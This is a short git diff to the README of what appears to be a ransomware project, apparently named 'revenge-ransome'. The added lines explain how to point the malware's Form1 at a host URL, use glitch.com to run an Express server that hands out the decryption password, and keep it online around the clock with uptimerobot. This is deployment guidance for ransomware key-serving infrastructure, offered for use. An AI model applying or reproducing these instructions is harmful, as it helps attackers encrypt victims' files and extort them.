@@ -39,6 +39,7 @@ const listener = app.listen(3000, () => {
 });
  
 ```
+<br>For the website for decrypting files you need to modify Form1: `string host = "website url, glitch can be used, express app example in readme";` this part and put the url exemple: `https://nameofyourproject.glitch.me`<br>
 - You can use [glitch.com](https://glitch.com) to create projects to get the decrypt password, if you want fresh project [clickhere](https://glitch.com/edit/#!/remix/revenge-ransome), but make sure to make the project 24/7 by using service like uptimerobot.
 
 
